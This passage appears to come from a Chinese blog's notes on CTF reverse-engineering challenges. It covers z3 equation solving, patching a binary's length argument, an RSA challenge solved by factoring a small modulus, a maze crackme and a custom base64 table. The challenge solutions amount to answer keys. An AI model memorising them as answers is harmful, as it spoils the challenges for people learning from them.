+ -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 == -13258)s.add(81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 == -1559)s.add(101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 == 6308)s.add(99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 == -1697)if s.check()==sat:    result=s.model()print(result)</code></pre><p> 这里的移位操作不能被识别，需要手动转换。</p><p> 其实这道题带了个简单的混淆</p> <pre class="language-none"><code class="language-none">unsigned __int64 __fastcall sub_C50(const char *a1, _BYTE *a2){  size_t v4; // rax  unsigned int v5; // edx  int v6; // edi  int v7; // ecx  __int64 v8; // r8  __int128 *v9; // rsi  unsigned int v10; // ecx  int v11; // eax  int v12; // edi  int v13; // edx  int v14; // eax  _BYTE *v15; // rsi  _BYTE *v16; // rcx  _BYTE *v17; // r8  int *i; // rax  unsigned __int64 result; // rax  __int128 v20[2]; // [rsp+0h] [rbp-48h] BYREF  __int64 v21; // [rsp+20h] [rbp-28h]  unsigned __int64 v22; // [rsp+28h] [rbp-20h]  v22 = __readfsqword(0x28u);  v20[0] = 0LL;  v21 = 0LL;  v20[1] = 0LL;  v4 = strlen(a1);  v5 = 0;  v6 = 9;  while ( v5 &lt; v4 )  {    v7 = a1[v5++];    v6 ^= v7;  }  if ( v6 )  {    v8 = 0LL;    v9 = v20;    while ( 1 )    {      v9 = (__int128 *)((char *)v9 + 4);      v10 = v8 + 1;      v11 = v6 / 10;      v12 = v6 % 10;      *((_DWORD *)v9 - 1) = v12;      LOBYTE(v13) = v12;      v6 = v11;      if ( !v11 )        break;      v8 = v10;    }    v14 = v8 - 1;    v15 = a2;    v16 = &amp;a2[v10];    v17 = &amp;a2[v8];    for ( i = (int *)v20 + v14; ; --i )    {      *v15 = v13 + 48;      if ( v17 == v15 )        break;      v13 = *i;      ++v15;    }  }  else  {    v16 = a2;  }  result = __readfsqword(0x28u) ^ v22;  *v16 = 0;  return result;}</code></pre><p> 这里面的函数没有对输入进行处理，所以不用管</p></li></ol><h1 id="修改二进制文件汇编指令"><a href="#修改二进制文件汇编指令" class="headerlink" title="修改二进制文件汇编指令"></a>修改二进制文件汇编指令</h1><p>1.题目——Overlong</p><p>运行程序，得到</p><pre class="language-none"><code class="language-none">I never broke the encoding：</code></pre><pre class="language-none"><code class="language-none">int __stdcall start(int a1, int a2, int a3, int a4){  CHAR Text[128]; // [esp+0h] [ebp-84h] BYREF  int v6; // [esp+80h] [ebp-4h]  v6 = sub_401160(Text, &amp;unk_402008, 28);  Text[v6] = 0;  MessageBoxA(0, Text, Caption, 0);  return 0;}</code></pre><p>这里只取出了TEXT的前28位，而程序运行后的输出长度正好是28，加上题目overlong提示和：结尾，猜测部分长度没显示</p><p>所以需要修改二进制文件汇编指令</p><pre class="language-none"><code class="language-none">.text:004011C0                 push    ebp.text:004011C1                 mov     ebp, esp.text:004011C3                 sub     esp, 84h.text:004011C9                 push    1Ch.text:004011CB                 push    offset unk_402008.text:004011D0                 lea     eax, [ebp+Text]</code></pre><p>1c对应28，所以需要将1c改大</p><p>1、ida修改–&gt; 点击菜单项“Edit”–“Patch program”–“Assemble” –&gt; 点击菜单项“Edit”–“Patch program”–“Apply patches to input file”，在弹出的对话框中点击OK按钮，则成功完成指令修改。</p><p>点击确认按钮时，可能会弹出无法写入对话框，只需去除该文件的只读属性，再次执行第三步即可。</p><p>2、OD修改–&gt;根据汇编指令定位–&gt;右键–&gt;二进制–&gt;编辑 ,其他的可以直接修改指令，但是这里修改之后后面的汇编代码全变了，虽然不知道为啥。</p><p>3、winhex修改–&gt;定位——先去ida的patch byte找到push 1c对应6A 1C 68 08 20 40 00 8D 85 7C FF FF FF 50 E8 84–&gt;去winhex修改1c，然后重新保存运行</p><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p>1、题目——Signin</p><pre class="language-none"><code class="language-none">__int64 __fastcall main(int a1, char **a2, char **a3){  char v4[16]; // [rsp+0h] [rbp-4A0h] BYREF  char v5[16]; // [rsp+10h] [rbp-490h] BYREF  char v6[16]; // [rsp+20h] [rbp-480h] BYREF  char v7[16]; // [rsp+30h] [rbp-470h] BYREF  char v8[112]; // [rsp+40h] [rbp-460h] BYREF  char v9[1000]; // [rsp+B0h] [rbp-3F0h] BYREF  unsigned __int64 v10; // [rsp+498h] [rbp-8h]  v10 = __readfsqword(0x28u);  puts("[sign in]");  printf("[input your flag]: ");  __isoc99_scanf("%99s", v8);  sub_96A(v8, v9);//加密函数直接linux远调就可以知道是转十六进制数；  __gmpz_init_set_str(v7, "ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35", 16LL);//十六进制  __gmpz_init_set_str(v6, v9, 16LL);  __gmpz_init_set_str(v4, "103461035900816914121390101299049044413950405173712170434161686539878160984549", 10LL);//十进制  __gmpz_init_set_str(v5, "65537", 10LL);  __gmpz_powm(v6, v6, v5, v4);  if ( (unsigned int)__gmpz_cmp(v6, v7) )    puts("GG!");  else    puts("TTTTTTTTTTql!");  return 0LL;}</code></pre><p>看到65537，加上查了__gmpz_powm()函数，也相当于__mpz_powm()函数，可以判断这是rsa加密</p><pre class="language-none"><code class="language-none">void mpz_powm (mpz_t rop, const mpz_t base, const mpz_t exp, const mpz_t mod) [Function]Set rop to base^exp mod mod.</code></pre><p> 其实就是计算 base 的 exp 次方，并对 mod 取模，最后将结果写入 rop 中 </p><p>剩下的就是解出p、q，然后写脚本了</p><pre class="language-none"><code class="language-none">C=M^E mod NC是密文，M是明文，E是公钥（E和 φ(N)互为质数），N是公共模数（质数 P 、Q相乘得到N），MOD就是模运算M=C^D mod N求D：E * D % φ(N) = 1    φ(N) = (P-1)(Q-1)   </code></pre><p>2、rsa</p><p>题目给出了公钥和flag.enc文件</p><pre class="language-none"><code class="language-none">(N,e)是公钥， (N, d)是私钥</code></pre><p>公钥和密钥生成</p><pre class="language-none"><code class="language-none">4.1 求N我们准备两个很小对质数，p ＝ 17q ＝ 19N ＝ p ＊ q ＝ 3234.2 求LL ＝ lcm（p－1， q－1）＝ lcm(16，18） ＝ 144144为16和18对最小公倍数4.3 求E求E必须要满足2个条件：1 &lt; E &lt; L ，gcd（E，L）=1即1 &lt; E &lt; 144，gcd（E，144） ＝ 1 #gcd，最大公因数E和144互为质数，5显然满足上述2个条件故E ＝ 5        此时公钥=(E，N）＝ （5，323）4.4 求D求D也必须满足2个条件：1 &lt; D &lt; L，E＊D mod L ＝ 1即1 &lt; D &lt; 144，5 ＊ D mod 144 ＝ 1显然当D＝ 29 时满足上述两个条件1 &lt; 29 &lt; 1445＊29 mod 144 ＝ 145 mod 144 ＝ 1此时私钥＝（D，N）＝（29，323）</code></pre><p>私钥和公钥都可以拿去解析</p><p>这里解析得到</p><pre class="language-none"><code class="language-none">e = 65537n=86934482296048119190666062003494800588905656017203025617216654058378322103517(n拿去分解)p = 285960468890451637935629440372639283459q = 304008741604601924494328155975272418463</code></pre><p>从文件读取公钥或者私钥</p><pre class="language-none"><code class="language-none">with open('private.pem', mode='rb') as privatefile:keydata = privatefile.read()#rb 是以二进制形式打开文件privkey = rsa.PrivateKey.load_pkcs1(keydata)</code></pre><pre class="language-none"><code class="language-none">import gmpy2 import rsa  e = 65537n = 86934482296048119190666062003494800588905656017203025617216654058378322103517p = 285960468890451637935629440372639283459q = 304008741604601924494328155975272418463phin = (q-1)*(p-1)d = gmpy2.invert(e, phin)key = rsa.PrivateKey(n, e, int(d), p, q)#生成私钥with open("D:\\new\\题目\\output\\flag.enc", "rb+") as f:    f = f.read()    print(rsa.decrypt(f, key))</code></pre><h1 id="Maze"><a href="#Maze" class="headerlink" title="Maze"></a>Maze</h1><p>Maze题一般都需要找到入口、出口还有移动方向</p><p>题目——unctf20201—easymaze</p><pre class="language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 *v3; // rax  char *v4; // rdi  unsigned __int64 v5; // rbx  const char *v6; // rdx  int v7; // eax  int v8; // er9  int v9; // er8  int v10; // edx  char v11; // cl  int v12; // ecx  int v13; // ecx  __int64 *v14; // rax  sub_1400011A0(argc, argv, envp);  dword_140006790[0] = 1;#把鼠标放上去显示int型  dword_140006794 = 1;  dword_1400067B4 = 1;  dword_1400067CC = 1;  dword_1400067EC = 1;  dword_1400067F0 = 1;  dword_1400067D4 = 1;  dword_1400067D8 = 1;  dword_1400067F8 = 1;  dword_140006810 = 1;  dword_14000682C = 1;  dword_140006844 = 1;  dword_140006840 = 1;  dword_140006864 = 1;  dword_140006868 = 1;  dword_140006884 = 1;  dword_1400068A0 = 1;  dword_1400068BC = 1;  dword_1400068DC = 1;  dword_14000689C = 1;  v3 = sub_140001800(std::cout, (__int64)"Plz inpu7 the P4th :");  std::ostream::operator&lt;&lt;(v3, sub_1400019D0);  v4 = input;  v5 = -1i64;  sub_140001AA0(std::cin, -1i64, input);  do    ++v5;  while ( input[v5] );  if ( v5 &gt; 0x11 )  {    v6 = "to0 lon9!t0o long!";    goto LABEL_26;  }  if ( v5 &lt; 0x11 )  {    v6 = (const char *)&amp;unk_140003770;    goto LABEL_26;  }  v7 = dword_140006710;  v8 = 0;  v9 = dword_140006714;  v10 = dword_140006710;  do  {    v11 = *v4;    if ( *v4 == 'A' )      goto LABEL_21;    if ( v11 == 'W' )    {      ++v10;      v12 = v7 % 2;      ++v7;      goto LABEL_20;    }    if ( v11 == 'E' )    {      ++v10;      v13 = v7 % 2;      ++v7;LABEL_16:      dword_140006710 = v7;      if ( v13 )        goto LABEL_23;      goto LABEL_17;    }    if ( v11 != 'D' )    {      if ( v11 != 'X' )      {        if ( v11 != 'Z' )        {          v6 = "What the fuck did you give me?";          goto LABEL_26;        }        --v10;        v12 = v7 % 2;        --v7;LABEL_20:        dword_140006710 = v7;        if ( !v12 )          goto LABEL_23;LABEL_21:        --v9;        goto LABEL_22;      }      --v10;      v13 = v7 % 2;      --v7;      goto LABEL_16;    }LABEL_17:    ++v9;LABEL_22:    dword_140006714 = v9;LABEL_23:    ++v8;    ++v4;  }  while ( v8 &lt; v5 );  v6 = "Congratulations on this forced to get the right flag, you entered is the correct answer!";    if ( dword_140006790[7 * v7 + v9] != 1 )        v6 = "Try it again little unlucky!";LABEL_26:  v14 = sub_140001800(std::cout, (__int64)v6);  std::ostream::operator&lt;&lt;(v14, sub_1400019D0);  return 0;}</code></pre><p>动调就可以把AWEDXZ的移动弄出来</p><p>在ida里面dd表示四个字节，db表示一个字节</p><pre class="language-none"><code class="language-none">data:00007FF673BF6794 dword_7FF673BF6794 dd 0                 ; DATA XREF: main+27↑w.data:00007FF673BF6798 dd 0.data:00007FF673BF679C db    0.data:00007FF673BF679D db    0.data:00007FF673BF679E db    0.data:00007FF673BF679F db    0.data:00007FF673BF67A0 db    0.data:00007FF673BF67A1 db    0.data:00007FF673BF67A2 db    0.data:00007FF673BF67A3 db    0.data:00007FF673BF67A4 db    0.data:00007FF673BF67A5 db    0.data:00007FF673BF67A6 db    0.data:00007FF673BF67A7 db    0</code></pre><p>要对着db按D转换数据类型，全部转为int型</p><h1 id="base64变表"><a href="#base64变表" class="headerlink" title="base64变表"></a>base64变表</h1><p>1、base64变表实际上就是将base64编码表进行了修改</p><p>2、题目——nctf2021 shadowbringer</p><pre class="language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp){  char v4[16]; // [rsp+20h] [rbp-60h] BYREF  char v5[15]; // [rsp+30h] [rbp-50h] BYREF  char v6; // [rsp+3Fh] [rbp-41h] BYREF  char v7[16]; // [rsp+40h] [rbp-40h] BYREF  char v8[16]; // [rsp+50h] [rbp-30h] BYREF  char v9[16]; // [rsp+60h] [rbp-20h] BYREF  char v10[32]; // [rsp+70h] [rbp-10h] BYREF  _main();  youknowwhat();  std::string::string((std::string *)v5);  std::allocator&lt;char&gt;::allocator(&amp;v6);  std::string::string(v4, "U&gt;F2UsQXN`5sXMELT=:7M_2&lt;X]^1ThaWF0=KM?9IUhAsTM5:T==_Ns&amp;&lt;Vhb!", &amp;v6);  std::allocator&lt;char&gt;::~allocator(&amp;v6);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(printf_0, "Welcome.Please input your flag:\n");  std::operator&gt;&gt;&lt;char&gt;(scanf, (std::string *)v5);  std::string::string((std::string *)v8, (const std::string *)v5);    Emet(v7, v8);    std::string::operator=(v5, v7);  std::string::~string((std::string *)v7);  std::string::~string((std::string *)v8);  std::string::string((std::string *)v10, (const std::string *)v5);    Selch(v9, v10);    std::string::operator=(v5, v9);                 std::string::~string((std::string *)v9);  std::string::~string((std::string *)v10);  if ( (unsigned __int8)std::operator==&lt;char&gt;(v5, v4) )    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(printf_0, "Right.");  else    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(printf_0, "Wrong.");  std::string::~string((std::string *)v4);  std::string::~string((std::string *)v5);  return 0;}</code></pre><pre class="language-none"><code class="language-none">std::string *__fastcall Emet(std::string *a1, std::string *a2){  int i; // ebx  char *v3; // rax  unsigned __int64 v4; // rax  int j; // ebx  unsigned int v6; // eax  char *v7; // rax  unsigned __int64 v9; // [rsp+20h] [rbp-90h] BYREF  char v10; // [rsp+2Eh] [rbp-82h] BYREF  char v11; // [rsp+2Fh] [rbp-81h] BYREF  char v12[16]; // [rsp+30h] [rbp-80h] BYREF  char v13[16]; // [rsp+40h] [rbp-70h] BYREF  char v14[16]; // [rsp+50h] [rbp-60h] BYREF  char v15[16]; // [rsp+60h] [rbp-50h] BYREF  char v16[16]; // [rsp+70h] [rbp-40h] BYREF  char v17[16]; // [rsp+80h] [rbp-30h] BYREF  char v18[16]; // [rsp+90h] [rbp-20h] BYREF  char v19[16]; // [rsp+A0h] [rbp-10h] BYREF  std::allocator&lt;char&gt;::allocator(&amp;v10);  std::string::string(&amp;v9, &amp;unk_48A000, &amp;v10);  std::allocator&lt;char&gt;::~allocator(&amp;v10);  std::allocator&lt;char&gt;::allocator(&amp;v11);  std::string::string(a1, &amp;unk_48A000, &amp;v11);  std::allocator&lt;char&gt;::~allocator(&amp;v11);  for ( i = 0; i &lt; (unsigned __int64)std::string::size(a2); ++i )  {    v3 = (char *)std::string::operator[](a2, i);    std::bitset&lt;8ull&gt;::bitset(v14, (unsigned int)*v3);    std::bitset&lt;8ull&gt;::to_string(v13, v14);    std::operator+&lt;char&gt;(v12, &amp;v9, v13);    std::string::operator=(&amp;v9, v12);    std::string::~string((std::string *)v12);    std::string::~string((std::string *)v13);  }  while ( 1 )  {    v4 = std::string::size((std::string *)&amp;v9);    if ( v4 == 6 * (v4 / 6) )      break;    std::operator+&lt;char&gt;(v15, &amp;v9, 48i64);    std::string::operator=(&amp;v9, v15);    std::string::~string((std::string *)v15);  }  for ( j = 0; j &lt; (unsigned __int64)std::string::size((std::string *)&amp;v9); j += 6 )  {    std::string::substr((std::string *)v18, (unsigned __int64)&amp;v9, j);    std::bitset&lt;6ull&gt;::bitset&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(v17, v18, 0i64);    v6 = std::bitset&lt;6ull&gt;::to_ulong(v17);    v7 = (char *)std::string::operator[](&amp;hisoralce, v6);    std::operator+&lt;char&gt;(v16, a1, (unsigned int)*v7);    std::string::operator=(a1, v16);    std::string::~string((std::string *)v16);    std::string::~string((std::string *)v18);  }  while ( (std::string::size(a1) &amp; 3) != 0 )  {    std::operator+&lt;char&gt;(v19, a1, 33i64);    std::string::operator=(a1, v19);    std::string::~string((std::string *)v19);  }  std::string::~string((std::string *)&amp;v9);  return a1;}</code></pre><p>这里的j+=6，像是base64，而&amp;hisorale是指针</p><pre class="language-none"><code class="language-none">bss:00000000004AA030 hisoralce db  28h ; (                   ; DATA XREF: youknowwhat(void)+2A↑o.bss:00000000004AA030                                         ; youknowwhat(void)+40↑o ....bss:00000000004AA031 db  3Dh ; =.bss:00000000004AA032 db 0BBh.bss:00000000004AA033 db    0.bss:00000000004AA034 db    0.bss:00000000004AA035 db    0.bss:00000000004AA036 db    0.bss:00000000004AA037 db    0</code></pre><p>需要对着db按d转换类型，才能看到该地址存储的内容</p>]]></content>
      
      
      
        <tags>
            
            <tag> AD </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
